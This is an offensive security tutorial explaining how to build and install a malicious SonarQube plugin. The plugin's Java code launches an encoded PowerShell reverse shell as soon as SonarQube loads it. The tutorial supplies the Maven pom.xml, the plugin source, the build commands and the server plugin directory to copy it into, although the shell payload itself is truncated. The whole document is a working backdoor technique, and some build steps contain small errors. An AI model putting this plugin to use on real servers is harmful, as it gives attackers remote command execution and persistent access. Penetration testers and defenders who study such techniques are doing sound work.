    Building a malicious plugin

      Just in case you have credentials to login in the Sonarqube web panel and the hability to import new plugins you could stablish a reverse shell connection with the server

      But first let's clear some things. It is possible that the option to upload plugins is disabled, in that case you must already have a connection inside the box which is hosting the sonarqube. That way you will be able to place the .jar plugin inside

      Have in mind that the code may change based on the version of sonarqube you are targeting

      In order to develop the plugin you'll need the following folder structure

      ├── META-INF
│   └── MANIFEST.MF
├── pom.xml
├── src
│   └── main
│       └── java
│           └── com
│               └── evil
│                   └── EvilPlugin.java

      The file pom.xml may contain. This file only contains information to load the plugin sucessfully

      <?xml version="1.0" encoding="UTF-8"?>
<project>
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.evil</groupId>
  <artifactId>sonar-evil-plugin</artifactId>
  <version>1.0</version>
  <packaging>sonar-plugin</packaging>
  <dependencies>
    <dependency>
      <groupId>org.sonarsource.sonarqube</groupId>
      <artifactId>sonar-plugin-api</artifactId>
      <version>7.8</version>
      <scope>provided</scope>
    </dependency>
  </dependencies>
  <build>
    <plugins>
      <plugin>
        <groupId>org.sonarsource.sonar-packaging-maven-plugin</groupId>
        <artifactId>sonar-packaging-maven-plugin</artifactId>
        <version>1.18.0.372</version>
        <extensions>true</extensions>
        <configuration>
          <pluginKey>evil</pluginKey>
          <pluginName>Evil Plugin</pluginName>
          <pluginClass>com.evil.EvilPlugin</pluginClass>
          <pluginDescription>Evil Plugin</pluginDescription>
          <sonarQubeMinVersion>6.7</sonarQubeMinVersion>
        </configuration>
      </plugin>
    </plugins>
  </build>
</project>

      The file EvilPlugin.java contains the code itself where the reverse shell resides

      package com.evil;

import org.sonar.api.Plugin;

public class EvilPlugin implements Plugin {
    @Override
    public void define(Context context) {
        try {
            String[] cmd = {"powershell.exe", "-e", "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgB (Base64 powershell reverse shell)"};
            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.start();
        } catch (Exception e) {}
    }
}

      Now compile it using 

      mvn clean package

      And include the manifest

      jar xf target/sonar-evil-plugin-1.0.jar META-INF/MANIFEST.MD

      This will generate a target folder where the .jar file will be placed. Now situate this file inside the following folder of the target box

      C:\sonarqube\sonarqube-7.8\extensions\plugins

      And finally to load the plugin the sonarqube service must be restarted. This can be done from the web panel of sonarqube
